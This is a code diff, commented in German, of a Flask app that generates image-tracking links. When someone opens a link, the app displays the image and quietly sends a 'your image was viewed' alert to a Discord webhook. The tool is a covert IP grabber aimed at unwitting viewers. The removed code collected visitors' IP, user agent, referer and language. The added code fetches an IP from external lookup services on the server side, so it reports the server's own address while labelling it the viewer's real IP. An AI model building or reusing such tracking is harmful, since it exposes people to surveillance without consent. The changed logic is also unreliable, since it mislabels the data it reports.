@@ -8,9 +8,6 @@ import base64
 
 app = Flask(__name__)
 
-# Speichere Tracking-Daten als base64-encoded JSON in der URL selbst
-# Das ist die einzige Möglichkeit für serverless Vercel
-
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
@@ -36,8 +33,7 @@ def upload_image():
             'id': tracking_id,
             'image_url': image_url,
             'webhook_url': webhook_url,
-            'created_at': datetime.now().isoformat(),
-            'visits': []
+            'created_at': datetime.now().isoformat()
         }
         
         # Kodiere Tracking-Daten als base64 für die URL
@@ -69,26 +65,25 @@ def track_image():
         # Dekodiere die Tracking-Daten
         tracking_data = json.loads(base64.b64decode(tracking_data_encoded).decode())
         
-        # Sammle Besucher-Informationen
-        visitor_info = {
-            'ip': request.remote_addr or 'Unbekannt',
-            'user_agent': request.headers.get('User-Agent', 'Unbekannt'),
-            'referer': request.headers.get('Referer', 'Direkter Zugriff'),
-            'timestamp': datetime.now().isoformat(),
-            'language': request.headers.get('Accept-Language', 'Unbekannt')
-        }
-        
-        # Füge Besuch hinzu
-        tracking_data['visits'].append(visitor_info)
+        # Hole IP-Adresse von myip.com
+        real_ip = "Unbekannt"
+        try:
+            ip_response = urllib.request.urlopen('https://api.myip.com', timeout=5)
+            real_ip = ip_response.read().decode().strip()
+        except:
+            try:
+                ip_response = urllib.request.urlopen('https://ipinfo.io/json', timeout=5)
+                ip_data = json.loads(ip_response.read().decode())
+                real_ip = ip_data.get('ip', 'Unbekannt')
+            except:
+                pass
         
         # Sende Discord-Benachrichtigung
         try:
             webhook_url = tracking_data['webhook_url']
-            response = send_discord_notification(webhook_url, visitor_info, tracking_data['id'])
-            print(f"Discord response: {response}")
+            send_discord_notification(webhook_url, real_ip, tracking_data['id'])
         except Exception as e:
             print(f"Discord Fehler: {e}")
-            # Discord-Benachrichtigung ist optional, aber wir loggen den Fehler
         
         # Zeige Tracking-Seite mit echtem Bild
         image_url = tracking_data['image_url']
@@ -149,18 +144,9 @@ def track_image():
     except Exception as e:
         return f"Fehler: {str(e)}", 500
 
-def send_discord_notification(webhook_url, visitor_info, tracking_id):
+def send_discord_notification(webhook_url, ip_address, tracking_id):
     """Sendet eine Benachrichtigung an Discord"""
     try:
-        # Hole echte IP-Adresse von externem Service
-        real_ip = "Unbekannt"
-        try:
-            ip_response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5)
-            ip_data = json.loads(ip_response.read().decode())
-            real_ip = ip_data.get('ip', 'Unbekannt')
-        except:
-            pass
-        
         embed = {
             "title": "🔍 Bild wurde angesehen!",
             "description": f"Jemand hat dein Tracking-Bild angesehen",
@@ -168,7 +154,7 @@ def send_discord_notification(webhook_url, visitor_info, tracking_id):
             "fields": [
                 {
                     "name": "🌐 IP-Adresse",
-                    "value": f"```\n{real_ip}\n```",
+                    "value": f"```\n{ip_address}\n```",
                     "inline": True
                 },
                 {
@@ -177,8 +163,8 @@ def send_discord_notification(webhook_url, visitor_info, tracking_id):
                     "inline": True
                 },
                 {
-                    "name": "👤 User-Agent",
-                    "value": f"```\n{visitor_info['user_agent'][:50]}...\n```" if len(visitor_info['user_agent']) > 50 else f"```\n{visitor_info['user_agent']}\n```",
+                    "name": "🔗 Tracking-ID",
+                    "value": f"```\n{tracking_id}\n```",
                     "inline": False
                 }
             ],
